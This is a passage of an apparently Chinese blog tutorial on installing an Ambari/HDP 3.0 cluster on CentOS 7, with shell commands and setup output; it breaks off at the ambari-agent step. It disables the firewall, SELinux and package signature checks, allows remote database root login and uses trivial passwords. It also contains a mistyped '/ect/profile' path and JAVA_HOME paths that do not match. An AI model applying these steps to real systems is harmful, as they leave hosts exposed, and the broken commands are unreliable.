style="text-align:center">4G</td><td>50G</td></tr><tr><td style="text-align:center">hdp-3</td><td style="text-align:center">CentOS7</td><td style="text-align:center">172.18.74.163(NAT/birdge)</td><td style="text-align:center">4G</td><td>50G</td></tr></tbody></table><p>配置好虚拟机就可以安装了，安装的方式如下</p><p><img "" class="lazyload placeholder" data-original="20201010141026410.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><h2 id="5server端环境配置ambari"><a class="markdownIt-Anchor" href="#5server端环境配置ambari">#</a> 5.Server 端环境配置 (ambari)</h2><p>说明：如果服务器已经配置好，则直接进行第 6 节客户端的配置。</p><h3 id="51安装http服务"><a class="markdownIt-Anchor" href="#51安装http服务">#</a> 5.1. 安装 http 服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install -y httpd</span><br><span class="line">systemctl start httpd</span><br><span class="line">systemctl enable httpd</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="52配置yum源"><a class="markdownIt-Anchor" href="#52配置yum源">#</a> 5.2. 配置 yum 源</h3><p>虚拟机的网络模式是 nat 或者桥接的时候就可以连通外网，这样我们就可以不用配置 CentOS 的 yum 源了，但是 Ambari 和 HDP 的还需要我们配置，需要将 Ambari 和 HDP 以及 HDP-UTILS 的安装包通过 SFTP 工具上传到 ambari 上。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建文件夹</span></span><br><span class="line">mkdir /var/www/html/&#123;ambari,hdp,hdp-utils&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压安装包到HTTP的网页根目录</span></span><br><span class="line">tar -zxvf HDP-UTILS-1.1.0.22-centos7.tar.gz -C /var/www/html/hdp-utils/</span><br><span class="line">tar -zxvf ambari-2.7.0.0-centos7.tar.gz -C /var/www/html/</span><br><span class="line">tar -zxvf HDP-3.0.0.0-centos7-rpm.tar.gz -C /var/www/html/hdp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就可以通过 http 的方式获取到相应的 rpm 文件和 repodata 文件来配置 yum 源了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 配置ambari的yum源</span></span><br><span class="line">vi /etc/yum.repos.d/ambari.repo</span><br><span class="line">[ambari]</span><br><span class="line">name=ambari</span><br><span class="line">baseurl=http://172.18.74.160/centos7/2.7.0.0-897/</span><br><span class="line">gpgcheck=0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">配置hdp和hdp-utils的yum源</span></span><br><span class="line">vi /etc/yum.repos.d/hdp.repo</span><br><span class="line">[HDP]</span><br><span class="line">name=HDP</span><br><span class="line">baseurl=http://172.18.74.160/hdp/HDP/centos7/3.0.0.0-1634/</span><br><span class="line">gpgcheck=0</span><br><span class="line">[HDP-UTILS]</span><br><span class="line">name=HDP_UTILS</span><br><span class="line">baseurl=http://172.18.74.160/hdp-utils/HDP-UTILS/centos7/1.1.0.22/</span><br><span class="line">gpgcheck=0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证</span></span><br><span class="line">yum repolist</span><br></pre></td></tr></table></figure><p>将 yum 文件使用 scp 发送到客户端节点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp /etc/yum.repos.d/ambari.repo hdp-1:/etc/yum.repos.d/</span><br><span class="line">scp /etc/yum.repos.d/hdp.repo hdp-1:/etc/yum.repos.d/</span><br></pre></td></tr></table></figure><h3 id="53数据库配置"><a class="markdownIt-Anchor" href="#53数据库配置">#</a> 5.3. 数据库配置</h3><p>数据库使用 MariaDB 作为元数据储存的库，存放 ambari 服务数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">yum install -y mariadb-server</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动 开机自启</span></span><br><span class="line">systemctl start mariadb &amp;&amp; systemctl enable mariadb</span><br><span class="line"><span class="meta">#</span><span class="bash"> 初始化</span></span><br><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[root@ambari</span> <span class="string">~]# mysql_secure_installation </span></span><br><span class="line"></span><br><span class="line"><span class="attr">NOTE</span>: <span class="string">RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB</span></span><br><span class="line">      <span class="attr">SERVERS</span> <span class="string">IN PRODUCTION USE!  PLEASE READ EACH STEP CAREFULLY!</span></span><br><span class="line"></span><br><span class="line"><span class="attr">In</span> <span class="string">order to log into MariaDB to secure it, we&#x27;ll need the current</span></span><br><span class="line"><span class="attr">password</span> <span class="string">for the root user.  If you&#x27;ve just installed MariaDB, and</span></span><br><span class="line"><span class="attr">you</span> <span class="string">haven&#x27;t set the root password yet, the password will be blank,</span></span><br><span class="line"><span class="attr">so</span> <span class="string">you should just press enter here.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Enter</span> <span class="string">current password for root (enter for none): </span></span><br><span class="line"><span class="meta">OK,</span> <span class="string">successfully used password, moving on...</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Setting</span> <span class="string">the root password ensures that nobody can log into the MariaDB</span></span><br><span class="line"><span class="attr">root</span> <span class="string">user without the proper authorisation.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Set</span> <span class="string">root password? [Y/n] </span></span><br><span class="line"><span class="attr">New</span> <span class="string">password: </span></span><br><span class="line"><span class="meta">Re-enter</span> <span class="string">new password: </span></span><br><span class="line"><span class="attr">Password</span> <span class="string">updated successfully!</span></span><br><span class="line"><span class="attr">Reloading</span> <span class="string">privilege tables..</span></span><br><span class="line"> <span class="meta">...</span> <span class="string">Success!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">By</span> <span class="string">default, a MariaDB installation has an anonymous user, allowing anyone</span></span><br><span class="line"><span class="attr">to</span> <span class="string">log into MariaDB without having to have a user account created for</span></span><br><span class="line"><span class="meta">them.</span>  <span class="string">This is intended only for testing, and to make the installation</span></span><br><span class="line"><span class="attr">go</span> <span class="string">a bit smoother.  You should remove them before moving into a</span></span><br><span class="line"><span class="attr">production</span> <span class="string">environment.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Remove</span> <span class="string">anonymous users? [Y/n] </span></span><br><span class="line"> <span class="meta">...</span> <span class="string">Success!</span></span><br><span class="line"></span><br><span class="line"><span class="meta">Normally,</span> <span class="string">root should only be allowed to connect from &#x27;localhost&#x27;.  This</span></span><br><span class="line"><span class="attr">ensures</span> <span class="string">that someone cannot guess at the root password from the network.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Disallow</span> <span class="string">root login remotely? [Y/n] n</span></span><br><span class="line"> <span class="meta">...</span> <span class="string">skipping.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">By</span> <span class="string">default, MariaDB comes with a database named &#x27;test&#x27; that anyone can</span></span><br><span class="line"><span class="meta">access.</span>  <span class="string">This is also intended only for testing, and should be removed</span></span><br><span class="line"><span class="attr">before</span> <span class="string">moving into a production environment.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Remove</span> <span class="string">test database and access to it? [Y/n] </span></span><br><span class="line"> <span class="meta">-</span> <span class="string">Dropping test database...</span></span><br><span class="line"> <span class="meta">...</span> <span class="string">Success!</span></span><br><span class="line"> <span class="meta">-</span> <span class="string">Removing privileges on test database...</span></span><br><span class="line"> <span class="meta">...</span> <span class="string">Success!</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Reloading</span> <span class="string">the privilege tables will ensure that all changes made so far</span></span><br><span class="line"><span class="attr">will</span> <span class="string">take effect immediately.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Reload</span> <span class="string">privilege tables now? [Y/n] </span></span><br><span class="line"> <span class="meta">...</span> <span class="string">Success!</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Cleaning</span> <span class="string">up...</span></span><br><span class="line"></span><br><span class="line"><span class="attr">All</span> <span class="string">done!  If you&#x27;ve completed all of the above steps, your MariaDB</span></span><br><span class="line"><span class="attr">installation</span> <span class="string">should now be secure.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Thanks</span> <span class="string">for using MariaDB!</span></span><br></pre></td></tr></table></figure><h4 id="531创建数据库"><a class="markdownIt-Anchor" href="#531创建数据库">#</a> 5.3.1. 创建数据库</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建amabri数据库</span></span><br><span class="line">create database ambari;</span><br><span class="line"><span class="meta">#</span><span class="bash">授权</span></span><br><span class="line">grant all on ambari.* to ambari@&#x27;%&#x27; identified by &#x27;bigdata&#x27;;</span><br><span class="line">grant all on ambari.* to ambari@localhost identified by &#x27;bigdata&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用ambari-server提供的sql脚本创建相关的表</span></span><br><span class="line">use ambari;</span><br><span class="line">source /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql</span><br></pre></td></tr></table></figure><h4 id="532将jdbc驱动包复制到指定目录usrsharejava"><a class="markdownIt-Anchor" href="#532将jdbc驱动包复制到指定目录usrsharejava">#</a> 5.3.2. 将 JDBC 驱动包复制到指定目录（/usr/share/java）</h4><p>将 jdbc 的驱动包使用 sftp 工具上传到 ambari</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv mysql-connector-java-*.jar /usr/share/java/mysql-connector-java.jar</span><br><span class="line">ambari-server setup --jdbc-db=mysql --jdbc-driver=/usr/share/java/mysql-connector-java.jar</span><br></pre></td></tr></table></figure><h3 id="54安装ambari-server"><a class="markdownIt-Anchor" href="#54安装ambari-server">#</a> 5.4. 安装 ambari-server</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">yum install -y ambari-server</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置ambari-server</span></span><br><span class="line">ambari-server setup</span><br></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[root@hdp-1</span> <span class="string">~]# ambari-server setup</span></span><br><span class="line"><span class="attr">Using</span> <span class="string">python  /usr/bin/python</span></span><br><span class="line"><span class="attr">Setup</span> <span class="string">ambari-server</span></span><br><span class="line"><span class="attr">Checking</span> <span class="string">SELinux...</span></span><br><span class="line"><span class="attr">SELinux</span> <span class="string">status is &#x27;enabled&#x27;</span></span><br><span class="line"><span class="attr">SELinux</span> <span class="string">mode is &#x27;permissive&#x27;</span></span><br><span class="line"><span class="attr">WARNING</span>: <span class="string">SELinux is set to &#x27;permissive&#x27; mode and temporarily disabled.</span></span><br><span class="line"><span class="attr">OK</span> <span class="string">to continue [y/n] (y)? y</span></span><br><span class="line"><span class="attr">Customize</span> <span class="string">user account for ambari-server daemon [y/n] (n)? y</span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">user account for ambari-server daemon (root):</span></span><br><span class="line"><span class="attr">Adjusting</span> <span class="string">ambari-server permissions and ownership...</span></span><br><span class="line"><span class="attr">Checking</span> <span class="string">firewall status...</span></span><br><span class="line"><span class="attr">Checking</span> <span class="string">JDK...</span></span><br><span class="line"><span class="meta">[1]</span> <span class="string">Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8</span></span><br><span class="line"><span class="meta">[2]</span> <span class="string">Custom JDK</span></span><br><span class="line">==============================================================================</span><br><span class="line"><span class="attr">Enter</span> <span class="string">choice (1): 2</span></span><br><span class="line"><span class="attr">WARNING</span>: <span class="string">JDK must be installed on all hosts and JAVA_HOME must be valid on all hosts.</span></span><br><span class="line"><span class="attr">WARNING</span>: <span class="string">JCE Policy files are required for configuring Kerberos security. If you plan to use Kerberos,please make sure JCE Unlimited Strength Jurisdiction Policy Files are valid on all hosts.</span></span><br><span class="line"><span class="attr">Path</span> <span class="string">to JAVA_HOME: /opt/jdk1.8.0_171/</span></span><br><span class="line"><span class="attr">Validating</span> <span class="string">JDK on Ambari Server...done.</span></span><br><span class="line"><span class="attr">Check</span> <span class="string">JDK version for Ambari Server...</span></span><br><span class="line"><span class="attr">JDK</span> <span class="string">version found: 8</span></span><br><span class="line"><span class="attr">Minimum</span> <span class="string">JDK version is 8 for Ambari. Skipping to setup different JDK for Ambari Server.</span></span><br><span class="line"><span class="attr">Checking</span> <span class="string">GPL software agreement...</span></span><br><span class="line"><span class="attr">GPL</span> <span class="string">License for LZO: https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html</span></span><br><span class="line"><span class="attr">Enable</span> <span class="string">Ambari Server to download and install GPL Licensed LZO packages [y/n] (n)? </span></span><br><span class="line"><span class="attr">Completing</span> <span class="string">setup...</span></span><br><span class="line"><span class="attr">Configuring</span> <span class="string">database...</span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">advanced database configuration [y/n] (n)? y</span></span><br><span class="line"><span class="attr">Configuring</span> <span class="string">database...</span></span><br><span class="line">==============================================================================</span><br><span class="line"><span class="attr">Choose</span> <span class="string">one of the following options:</span></span><br><span class="line"><span class="meta">[1]</span> <span class="string">- PostgreSQL (Embedded)</span></span><br><span class="line"><span class="meta">[2]</span> <span class="string">- Oracle</span></span><br><span class="line"><span class="meta">[3]</span> <span class="string">- MySQL / MariaDB</span></span><br><span class="line"><span class="meta">[4]</span> <span class="string">- PostgreSQL</span></span><br><span class="line"><span class="meta">[5]</span> <span class="string">- Microsoft SQL Server (Tech Preview)</span></span><br><span class="line"><span class="meta">[6]</span> <span class="string">- SQL Anywhere</span></span><br><span class="line"><span class="meta">[7]</span> <span class="string">- BDB</span></span><br><span class="line">==============================================================================</span><br><span class="line"><span class="attr">Enter</span> <span class="string">choice (1): 3</span></span><br><span class="line"><span class="attr">Hostname</span> <span class="string">(localhost): </span></span><br><span class="line"><span class="attr">Port</span> <span class="string">(3306): </span></span><br><span class="line"><span class="attr">Database</span> <span class="string">name (ambari): </span></span><br><span class="line"><span class="attr">Username</span> <span class="string">(ambari): </span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">Database Password (bigdata): </span></span><br><span class="line"><span class="attr">Configuring</span> <span class="string">ambari database...</span></span><br><span class="line"><span class="attr">Should</span> <span class="string">ambari use existing default jdbc /usr/share/java/mysql-connector-java.jar [y/n] (y)? </span></span><br><span class="line"><span class="attr">Configuring</span> <span class="string">remote database connection properties...</span></span><br><span class="line"><span class="attr">WARNING</span>: <span class="string">Before starting Ambari Server, you must run the following DDL against the database to create the schema: /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql</span></span><br><span class="line"><span class="attr">Proceed</span> <span class="string">with configuring remote database connection properties [y/n] (y)? </span></span><br><span class="line"><span class="attr">Extracting</span> <span class="string">system views...</span></span><br><span class="line"><span class="attr">ambari-admin-2.7.0.0.897.jar</span></span><br><span class="line"><span class="attr">....</span></span><br><span class="line"><span class="attr">Ambari</span> <span class="string">repo file doesn&#x27;t contain latest json url, skipping repoinfos modification</span></span><br><span class="line"><span class="attr">Adjusting</span> <span class="string">ambari-server permissions and ownership...</span></span><br><span class="line"><span class="attr">Ambari</span> <span class="string">Server &#x27;setup&#x27; completed successfully.</span></span><br></pre></td></tr></table></figure><h3 id="55启动ambari-server"><a class="markdownIt-Anchor" href="#55启动ambari-server">#</a> 5.5 启动 ambari-server</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ambari-server start</span><br></pre></td></tr></table></figure><p>可以访问 ambari 的 web 界面: <a href="http://172.18.74.160:8080">http://172.18.74.160:8080</a></p><h2 id="6client端环境配置"><a class="markdownIt-Anchor" href="#6client端环境配置">#</a> 6.Client 端环境配置</h2><p>说明：以下配置是在需要安装集群的各个节点中进行，此处为 hdp-1,hdp-2,hdp-3。</p><h3 id="61修改主机名和配置主机到ip的映射所有节点"><a class="markdownIt-Anchor" href="#61修改主机名和配置主机到ip的映射所有节点">#</a> 6.1 修改主机名和配置主机到 IP 的映射 (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 分别修改三台机器的主机名</span></span><br><span class="line">hostnamectl set-hostname hdp-1</span><br><span class="line">hostnamectl set-hostname hdp-2</span><br><span class="line">hostnamectl set-hostname hdp-3</span><br><span class="line"><span class="meta">#</span><span class="bash">立即生效</span></span><br><span class="line">bash</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置主机名到IP的映射</span></span><br><span class="line">vi /etc/hosts</span><br><span class="line">172.18.74.160 ambari</span><br><span class="line">172.18.74.161 hdp-1</span><br><span class="line">172.18.74.162 hdp-2</span><br><span class="line">172.18.74.163 hdp-3</span><br></pre></td></tr></table></figure><h3 id="62关闭防火墙和关闭selinux所有节点"><a class="markdownIt-Anchor" href="#62关闭防火墙和关闭selinux所有节点">#</a> 6.2 关闭防火墙和关闭 SELinux (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 关闭防火墙</span></span><br><span class="line">systemctl stop firewalld &amp;&amp; systemctl disable firewalld</span><br><span class="line"><span class="meta">#</span><span class="bash"> 关闭selinux</span></span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">SELINUX=disabled</span><br></pre></td></tr></table></figure><h3 id="63配置免密登录所有节点"><a class="markdownIt-Anchor" href="#63配置免密登录所有节点">#</a> 6.3. 配置免密登录 (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> hpd-1</span></span><br><span class="line">ssh-keygen</span><br><span class="line">ssh-copy-id hdp-1</span><br><span class="line">ssh-copy-id hdp-2</span><br><span class="line">ssh-copy-id hdp-3</span><br><span class="line"><span class="meta">#</span><span class="bash"> hdp-2</span></span><br><span class="line">ssh-keygen</span><br><span class="line">ssh-copy-id hdp-1</span><br><span class="line">ssh-copy-id hdp-2</span><br><span class="line">ssh-copy-id hdp-3</span><br><span class="line"><span class="meta">#</span><span class="bash"> hdp-3</span></span><br><span class="line">ssh-keygen</span><br><span class="line">ssh-copy-id hdp-1</span><br><span class="line">ssh-copy-id hdp-2</span><br><span class="line">ssh-copy-id hdp-3</span><br></pre></td></tr></table></figure><h3 id="64安装时间同步服务ntp"><a class="markdownIt-Anchor" href="#64安装时间同步服务ntp">#</a> 6.4. 安装时间同步服务 ntp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">hdp-1</span></span><br><span class="line">yum install -y ntp</span><br><span class="line">vi /etc/ntp.conf</span><br><span class="line">server 127.127.1.0</span><br><span class="line">fudge 127.127.1.0 stratum 10</span><br><span class="line">systemctl start ntpd</span><br><span class="line">systemctl enable ntpd</span><br><span class="line"><span class="meta">#</span><span class="bash">hdp-2</span></span><br><span class="line">yum install -y ntpdate</span><br><span class="line">ntpdate hdp-1</span><br><span class="line"><span class="meta">#</span><span class="bash">hdp-3</span></span><br><span class="line">yum install -y ntpdate</span><br><span class="line">ntpdate hdp-1</span><br></pre></td></tr></table></figure><h3 id="65关闭大页面压缩所有节点"><a class="markdownIt-Anchor" href="#65关闭大页面压缩所有节点">#</a> 6.5 关闭大页面压缩 (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</span><br><span class="line">echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag</span><br></pre></td></tr></table></figure><h3 id="66安装配置jdk"><a class="markdownIt-Anchor" href="#66安装配置jdk">#</a> 6.6. 安装配置 JDK</h3><p>将 jdk 的安装包上传到 hdp-1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">解压</span></span><br><span class="line">tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置环境变量</span></span><br><span class="line">vi /etc/profile</span><br><span class="line">export JAVA_HOME=/usr/local/jdk</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br><span class="line"><span class="meta">#</span><span class="bash"> 刷新环境变量</span></span><br><span class="line">source /ect/profile</span><br><span class="line">java</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将jdk和环境变量发送到其它机器</span></span><br><span class="line">scp -r /usr/local/jdk  hdp-2:/usr/local/</span><br><span class="line">scp -r /usr/local/jdk  hdp-3:/usr/local/</span><br><span class="line">scp  /etc/profile hdp-2:/etc/</span><br><span class="line">scp  /etc/profile hdp-3:/etc/</span><br><span class="line"><span class="meta">#</span><span class="bash"> hdp-2 hdp-3</span></span><br><span class="line">source /ect/profile</span><br><span class="line">java</span><br></pre></td></tr></table></figure><h3 id="67安装必要软件所有节点"><a class="markdownIt-Anchor" href="#67安装必要软件所有节点">#</a> 6.7. 安装必要软件 (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum -y install libtirpc-devel</span><br><span class="line">yum -y install psmisc</span><br><span class="line">yum -y install redhat-lsb</span><br><span class="line">yum -y install nc</span><br><span class="line">yum -y install gcc</span><br><span class="line">yum -y install python-devel</span><br><span class="line">yum -y install python-kerberos-1.1-15.el7.x86_64</span><br><span class="line">yum -y install rpcbind-0.2.0-49.el7.x86_64</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="68安装mysql数据库hdp-2安装hive可选"><a class="markdownIt-Anchor" href="#68安装mysql数据库hdp-2安装hive可选">#</a> 6.8. 安装 MySQL 数据库 (hdp-2，安装 Hive 可选)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">yum install -y mariadb-server</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动 开机自启</span></span><br><span class="line">systemctl start mariadb &amp;&amp; systemctl enable mariadb</span><br><span class="line"><span class="meta">#</span><span class="bash"> 初始化</span></span><br><span class="line">mysql_secure_installation</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入数据库</span></span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create database hive;</span><br><span class="line">create user &quot;hive&quot;@&quot;%&quot; identified by &quot;hive&quot;;</span><br><span class="line">grant all privileges on hive.* to &#x27;hive&#x27;@&#x27;%&#x27; identified by &#x27;hive&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h3 id="69安装和配置ambari-agent所有节点"><a class="markdownIt-Anchor" href="#69安装和配置ambari-agent所有节点">#</a> 6.9. 安装和配置 ambari-agent (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">yum install -y ambari-agent</span><br><span class="line"><span 